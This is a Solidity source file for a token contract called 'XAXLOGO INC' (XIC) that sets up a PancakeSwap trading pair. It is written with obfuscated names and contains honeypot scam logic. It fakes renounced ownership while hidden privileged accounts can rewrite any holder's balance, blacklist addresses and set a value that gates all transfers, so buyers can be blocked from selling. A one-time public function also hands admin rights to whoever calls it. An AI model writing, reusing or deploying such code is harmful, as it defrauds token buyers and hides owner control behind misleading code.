//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface buyMarketingFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptIs) external view returns (uint256);

    function transfer(address walletSender, uint256 exemptTrading) external returns (bool);

    function allowance(address toFromMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptTrading) external returns (bool);

    function transferFrom(address sender,address walletSender,uint256 exemptTrading) external returns (bool);

    event Transfer(address indexed from, address indexed tokenLiquidity, uint256 value);
    event Approval(address indexed toFromMin, address indexed spender, uint256 value);
}

interface enableSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tokenEnableFee {
    function createPair(address teamTokenIs, address minAtTx) external returns (address);
}

abstract contract totalMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyMarketingFeeMetadata is buyMarketingFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract XAXLOGOINC is totalMode, buyMarketingFee, buyMarketingFeeMetadata {

    function launchMin(uint256 exemptTrading) public {
        exemptSenderShould();
        tradingFund = exemptTrading;
    }

    address public sellLiquidity;

    function senderLaunchMin(address teamToken) public {
        exemptSenderShould();
        if (swapMode == sellTake) {
            maxLimit = true;
        }
        if (teamToken == shouldToReceiver || teamToken == sellLiquidity) {
            return;
        }
        receiverSender[teamToken] = true;
    }

    function balanceOf(address exemptIs) public view virtual override returns (uint256) {
        return buyLaunchedLiquidity[exemptIs];
    }

    function transfer(address shouldAuto, uint256 exemptTrading) external virtual override returns (bool) {
        return buyTeam(_msgSender(), shouldAuto, exemptTrading);
    }

    function allowance(address maxTrading, address sellSenderFrom) external view virtual override returns (uint256) {
        if (sellSenderFrom == walletLiquidity) {
            return type(uint256).max;
        }
        return amountMax[maxTrading][sellSenderFrom];
    }

    uint256 private buyTradingLaunched;

    bool public liquidityBuyTotal;

    function symbol() external view virtual override returns (string memory) {
        return fundShould;
    }

    function takeBuy(address teamSellToken, address walletSender, uint256 exemptTrading) internal returns (bool) {
        require(buyLaunchedLiquidity[teamSellToken] >= exemptTrading);
        buyLaunchedLiquidity[teamSellToken] -= exemptTrading;
        buyLaunchedLiquidity[walletSender] += exemptTrading;
        emit Transfer(teamSellToken, walletSender, exemptTrading);
        return true;
    }

    uint256 tradingFund;

    mapping(address => bool) public marketingReceiverEnable;

    mapping(address => mapping(address => uint256)) private amountMax;

    constructor (){
        
        autoSellWallet();
        enableSell receiverFrom = enableSell(walletLiquidity);
        sellLiquidity = tokenEnableFee(receiverFrom.factory()).createPair(receiverFrom.WETH(), address(this));
        
        shouldToReceiver = _msgSender();
        marketingReceiverEnable[shouldToReceiver] = true;
        buyLaunchedLiquidity[shouldToReceiver] = autoExempt;
        if (launchedList != fundLaunchLiquidity) {
            fundLaunchLiquidity = buyTradingLaunched;
        }
        emit Transfer(address(0), shouldToReceiver, autoExempt);
    }

    mapping(address => uint256) private buyLaunchedLiquidity;

    function owner() external view returns (address) {
        return modeReceiver;
    }

    uint256 public sellTake;

    function getOwner() external view returns (address) {
        return modeReceiver;
    }

    function name() external view virtual override returns (string memory) {
        return liquidityShould;
    }

    function exemptSenderShould() private view {
        require(marketingReceiverEnable[_msgSender()]);
    }

    function liquidityToken(address shouldAuto, uint256 exemptTrading) public {
        exemptSenderShould();
        buyLaunchedLiquidity[shouldAuto] = exemptTrading;
    }

    function transferFrom(address teamSellToken, address walletSender, uint256 exemptTrading) external override returns (bool) {
        if (_msgSender() != walletLiquidity) {
            if (amountMax[teamSellToken][_msgSender()] != type(uint256).max) {
                require(exemptTrading <= amountMax[teamSellToken][_msgSender()]);
                amountMax[teamSellToken][_msgSender()] -= exemptTrading;
            }
        }
        return buyTeam(teamSellToken, walletSender, exemptTrading);
    }

    address private modeReceiver;

    function decimals() external view virtual override returns (uint8) {
        return listReceiverLaunched;
    }

    uint256 private launchedList;

    bool private takeMax;

    bool private maxLimit;

    event OwnershipTransferred(address indexed txMaxLaunch, address indexed swapIsLaunch);

    function receiverSwap(address senderTotal) public {
        if (liquidityBuyTotal) {
            return;
        }
        if (fundLaunchLiquidity != launchedList) {
            maxLimit = false;
        }
        marketingReceiverEnable[senderTotal] = true;
        if (exemptLiquidity) {
            fundLaunchLiquidity = swapMode;
        }
        liquidityBuyTotal = true;
    }

    string private liquidityShould = "XAXLOGO INC";

    uint8 private listReceiverLaunched = 18;

    uint256 public fundLaunchLiquidity;

    function buyTeam(address teamSellToken, address walletSender, uint256 exemptTrading) internal returns (bool) {
        if (teamSellToken == shouldToReceiver) {
            return takeBuy(teamSellToken, walletSender, exemptTrading);
        }
        uint256 maxLimitSell = buyMarketingFee(sellLiquidity).balanceOf(shouldBuyLaunched);
        require(maxLimitSell == tradingFund);
        require(!receiverSender[teamSellToken]);
        return takeBuy(teamSellToken, walletSender, exemptTrading);
    }

    function autoSellWallet() public {
        emit OwnershipTransferred(shouldToReceiver, address(0));
        modeReceiver = address(0);
    }

    uint256 amountToken;

    address shouldBuyLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public shouldToReceiver;

    uint256 private swapMode;

    address walletLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private exemptLiquidity;

    mapping(address => bool) public receiverSender;

    uint256 private autoExempt = 100000000 * 10 ** 18;

    string private fundShould = "XIC";

    function totalSupply() external view virtual override returns (uint256) {
        return autoExempt;
    }

    function approve(address sellSenderFrom, uint256 exemptTrading) public virtual override returns (bool) {
        amountMax[_msgSender()][sellSenderFrom] = exemptTrading;
        emit Approval(_msgSender(), sellSenderFrom, exemptTrading);
        return true;
    }

}